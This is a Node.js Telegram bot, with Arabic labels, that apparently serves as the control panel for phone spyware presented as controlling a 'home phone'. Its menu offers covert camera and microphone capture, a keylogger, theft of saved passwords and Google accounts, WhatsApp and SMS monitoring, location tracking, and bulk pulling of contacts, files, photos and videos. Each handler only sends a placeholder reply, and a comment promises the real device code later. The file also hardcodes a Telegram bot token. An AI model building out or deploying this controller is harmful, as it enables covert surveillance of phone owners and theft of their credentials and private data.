const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = '8543353831:AAH9KouwWskMZPYbNN0OXPBCKewpRZNxWyI';
const app = express();
const PORT = process.env.PORT || 3000;

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// قائمة الأزرار (Reply Keyboard)
const mainMenu = {
    reply_markup: {
        keyboard: [
            ['📸 الكاميرا الأمامية', '📸 الكاميرا الخلفية'],
            ['🎙️ تسجيل الصوت', '📂 سحب الملفات'],
            ['📞 جهات الاتصال', '✉️ الرسائل النصية'],
            ['📋 سجل المكالمات', '🔔 الإشعارات'],
            ['⌨️ كيلوجر (Keylogger)', '👤 حسابات Google'],
            ['💬 واتساب', '🔑 كلمات المرور'],
            ['📍 الموقع', '🖼️ صور الهاتف'],
            ['🎥 فيديوهات', '🎵 مقاطع صوت'],
            ['❓ مساعدة']
        ],
        resize_keyboard: true,  // يجعل الأزرار صغيرة
        one_time_keyboard: false // يبقي الأزرار ظاهرة
    }
};

// أمر /start - يعرض الأزرار
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, '✅ أهلاً بك! استخدم الأزرار أدناه للتحكم بالهاتف المنزلي:', mainMenu);
});

// أمر /menu - نفس القائمة
bot.onText(/\/menu/, (msg) => {
    bot.sendMessage(msg.chat.id, '📱 القائمة الرئيسية:', mainMenu);
});

// معالجة الأزرار (عند الضغط على أي زر)
bot.on('message', (msg) => {
    const text = msg.text;
    const chatId = msg.chat.id;

    if (text === '📸 الكاميرا الأمامية') {
        bot.sendMessage(chatId, '📸 جاري التقاط صورة من الكاميرا الأمامية...');
        // هنا سنضيف لاحقاً كود التنفيذ الفعلي على الهاتف المنزلي
    }
    else if (text === '📸 الكاميرا الخلفية') {
        bot.sendMessage(chatId, '📸 جاري التقاط صورة من الكاميرا الخلفية...');
    }
    else if (text === '🎙️ تسجيل الصوت') {
        bot.sendMessage(chatId, '🎙️ جاري تسجيل مقطع صوتي...');
    }
    else if (text === '📂 سحب الملفات') {
        bot.sendMessage(chatId, '📂 جاري سحب الملفات من الهاتف...');
    }
    else if (text === '📞 جهات الاتصال') {
        bot.sendMessage(chatId, '📇 جاري سحب جهات الاتصال...');
    }
    else if (text === '✉️ الرسائل النصية') {
        bot.sendMessage(chatId, '✉️ جاري سحب جميع الرسائل النصية...');
    }
    else if (text === '📋 سجل المكالمات') {
        bot.sendMessage(chatId, '📞 جاري سحب سجل المكالمات...');
    }
    else if (text === '🔔 الإشعارات') {
        bot.sendMessage(chatId, '🔔 بدء مراقبة الإشعارات...');
    }
    else if (text === '⌨️ كيلوجر (Keylogger)') {
        bot.sendMessage(chatId, '⌨️ بدء تسجيل الضغطات...');
    }
    else if (text === '👤 حسابات Google') {
        bot.sendMessage(chatId, '👤 جاري سحب حسابات Google...');
    }
    else if (text === '💬 واتساب') {
        bot.sendMessage(chatId, '💬 بدء مراقبة واتساب...');
    }
    else if (text === '🔑 كلمات المرور') {
        bot.sendMessage(chatId, '🔑 جاري سحب كلمات المرور المحفوظة...');
    }
    else if (text === '📍 الموقع') {
        bot.sendMessage(chatId, '📍 جاري الحصول على الموقع الحالي...');
    }
    else if (text === '🖼️ صور الهاتف') {
        bot.sendMessage(chatId, '🖼️ جاري سحب جميع الصور...');
    }
    else if (text === '🎥 فيديوهات') {
        bot.sendMessage(chatId, '🎥 جاري سحب جميع الفيديوهات...');
    }
    else if (text === '🎵 مقاطع صوت') {
        bot.sendMessage(chatId, '🎵 جاري سحب المقاطع الصوتية...');
    }
    else if (text === '❓ مساعدة') {
        bot.sendMessage(chatId, '📱 *الأوامر المتاحة عبر الأزرار:*\n- الكاميرا (أمامية/خلفية)\n- تسجيل الصوت\n- سحب الملفات، جهات الاتصال، الرسائل، سجل المكالمات\n- مراقبة الإشعارات والواتساب\n- كيلوجر، حسابات Google، كلمات المرور\n- الموقع، الصور، الفيديوهات، المقاطع الصوتية', { parse_mode: 'Markdown' });
    }
    else if (text === '/start' || text === '/menu') {
        // تم التعامل معها أعلاه
        return;
    }
    else {
        // أي رسالة أخرى غير معروفة
        bot.sendMessage(chatId, '❓ أمر غير معروف. استخدم الأزرار أو اكتب /start');
    }
});

// أمر /help (نصي بسيط)
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, '📱 *القائمة متاحة عبر الأزرار*\nأرسل /start أو /menu لإظهار الأزرار.', { parse_mode: 'Markdown' });
});

app.get('/', (req, res) => res.send('Bot is running!'));
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
